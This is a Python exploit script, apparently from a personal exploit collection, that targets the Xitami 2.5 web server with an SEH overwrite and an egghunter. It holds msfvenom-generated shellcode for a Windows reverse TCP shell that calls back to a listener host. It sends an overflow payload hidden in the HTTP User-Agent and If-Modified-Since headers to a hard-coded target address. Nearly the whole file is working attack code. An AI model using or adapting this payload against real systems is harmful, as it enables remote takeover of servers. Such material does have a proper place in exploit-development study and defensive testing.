#!/usr/bin/env python

print "`````````````````````````````````````````````````````````````````````"
print "`   Exploit By      : 0xAnnLynn                                     `"
print "`   Exploit Title   : Xitami 2.5 EggHunter + SEH                    `"
print "`   Exploit Date    : 02.11.2020                                    `"
print "`   Practice        : Unknown                                       `"
print "`   GitHub          : https://github.com/TamilHackz/i-make-exploits `"
print "`                                                                   `"
print "`````````````````````````````````````````````````````````````````````"


import socket
import sys
host = "192.168.0.119"
port = 80
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.111 LPORT=4444 -e x86/alpha_mixed -f c
shellcode = (
"\x89\xe2\xd9\xe5\xd9\x72\xf4\x5e\x56\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x4b\x4c\x39\x78\x6b\x32\x35\x50\x53\x30\x73\x30\x35\x30\x6d"
"\x59\x78\x65\x34\x71\x6f\x30\x31\x74\x6c\x4b\x42\x70\x34\x70"
"\x6e\x6b\x66\x32\x44\x4c\x6e\x6b\x50\x52\x77\x64\x6e\x6b\x64"
"\x32\x31\x38\x36\x6f\x6f\x47\x51\x5a\x74\x66\x76\x51\x59\x6f"
"\x6e\x4c\x65\x6c\x73\x51\x73\x4c\x36\x62\x64\x6c\x75\x70\x39"
"\x51\x68\x4f\x56\x6d\x76\x61\x7a\x67\x7a\x42\x68\x72\x70\x52"
"\x43\x67\x4c\x4b\x63\x62\x52\x30\x6e\x6b\x51\x5a\x57\x4c\x6c"
"\x4b\x70\x4c\x46\x71\x51\x68\x39\x73\x62\x68\x67\x71\x4b\x61"
"\x52\x71\x4e\x6b\x53\x69\x67\x50\x65\x51\x38\x53\x4c\x4b\x71"
"\x59\x34\x58\x78\x63\x65\x6a\x63\x79\x4e\x6b\x46\x54\x6c\x4b"
"\x66\x61\x7a\x76\x65\x61\x49\x6f\x6c\x6c\x79\x51\x4a\x6f\x34"
"\x4d\x55\x51\x4f\x37\x50\x38\x59\x70\x43\x45\x59\x66\x54\x43"
"\x33\x4d\x4a\x58\x47\x4b\x51\x6d\x64\x64\x32\x55\x59\x74\x32"
"\x78\x6c\x4b\x66\x38\x76\x44\x75\x51\x4e\x33\x73\x56\x6e\x6b"
"\x74\x4c\x52\x6b\x4e\x6b\x63\x68\x67\x6c\x36\x61\x59\x43\x6e"
"\x6b\x53\x34\x4c\x4b\x45\x51\x38\x50\x6b\x39\x33\x74\x71\x34"
"\x31\x34\x43\x6b\x53\x6b\x53\x51\x46\x39\x51\x4a\x46\x31\x6b"
"\x4f\x6b\x50\x61\x4f\x53\x6f\x72\x7a\x4e\x6b\x42\x32\x68\x6b"
"\x4e\x6d\x73\x6d\x75\x38\x74\x73\x34\x72\x47\x70\x67\x70\x43"
"\x58\x61\x67\x44\x33\x56\x52\x63\x6f\x72\x74\x71\x78\x52\x6c"
"\x54\x37\x31\x36\x46\x67\x79\x6f\x39\x45\x68\x38\x4a\x30\x77"
"\x71\x57\x70\x63\x30\x65\x79\x5a\x64\x71\x44\x76\x30\x53\x58"
"\x44\x69\x6b\x30\x50\x6b\x35\x50\x6b\x4f\x39\x45\x36\x30\x70"
"\x50\x66\x30\x70\x50\x51\x50\x46\x30\x71\x50\x66\x30\x33\x58"
"\x7a\x4a\x44\x4f\x59\x4f\x6d\x30\x69\x6f\x68\x55\x6e\x77\x52"
"\x4a\x54\x45\x55\x38\x69\x50\x4e\x48\x43\x30\x32\x4f\x52\x48"
"\x34\x42\x35\x50\x64\x51\x61\x4c\x4c\x49\x4d\x36\x62\x4a\x66"
"\x70\x63\x66\x53\x67\x73\x58\x4d\x49\x59\x35\x31\x64\x51\x71"
"\x39\x6f\x58\x55\x4e\x65\x39\x50\x63\x44\x74\x4c\x79\x6f\x30"
"\x4e\x66\x68\x30\x75\x6a\x4c\x63\x58\x7a\x50\x78\x35\x6e\x42"
"\x73\x66\x6b\x4f\x4e\x35\x33\x58\x65\x33\x50\x6d\x52\x44\x63"
"\x30\x6d\x59\x4d\x33\x73\x67\x63\x67\x70\x57\x74\x71\x4b\x46"
"\x30\x6a\x36\x72\x30\x59\x56\x36\x4a\x42\x6b\x4d\x55\x36\x59"
"\x57\x51\x54\x65\x74\x47\x4c\x77\x71\x53\x31\x4e\x6d\x67\x34"
"\x46\x44\x72\x30\x4f\x36\x53\x30\x53\x74\x63\x64\x46\x30\x43"
"\x66\x62\x76\x70\x56\x72\x66\x53\x66\x70\x4e\x62\x76\x70\x56"
"\x33\x63\x76\x36\x70\x68\x70\x79\x58\x4c\x67\x4f\x4f\x76\x79"
"\x6f\x5a\x75\x6d\x59\x4d\x30\x70\x4e\x66\x36\x63\x76\x4b\x4f"
"\x36\x50\x50\x68\x57\x78\x4f\x77\x47\x6d\x63\x50\x39\x6f\x6e"
"\x35\x4f\x4b\x4c\x30\x78\x35\x6e\x42\x42\x76\x35\x38\x4e\x46"
"\x6f\x65\x6d\x6d\x6f\x6d\x69\x6f\x79\x45\x75\x6c\x43\x36\x31"
"\x6c\x57\x7a\x6f\x70\x79\x6b\x79\x70\x72\x55\x67\x75\x6f\x4b"
"\x33\x77\x36\x73\x34\x32\x72\x4f\x31\x7a\x47\x70\x31\x43\x69"
"\x6f\x7a\x75\x41\x41"
)

egg =  b""
egg += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
egg += b"\x05\x5a\x74\xef\xb8\x77\x30\x30\x77\x89\xd7\xaf\x75"
egg += b"\xea\xaf\x75\xe7\xff\xe7"

nSEH = "\xeb\xcc\x90\x90" #short jump backwards
SEH = "\xc4\xd9\x44"
crash = "A"*138
crash += egg
crash += 'A'*(188-len(crash))
crash += nSEH
crash += SEH

req = "GET / HTTP/1.1\r\n"
req += "Host: 192.168.0.119\r\n"
req += "User-Agent: w00ww00w" + shellcode
req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += "Accept-Language: en-US,en;q=0.5\r\n"
req += "Accept-Encoding: gzip, deflate\r\n"
req += "Connection: close\r\n"
req += "Upgrade-Insecure-Requests: 1\r\n"
req += "If-Modified-Since: Wed, " + crash + "\r\n\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(req)
s.close()
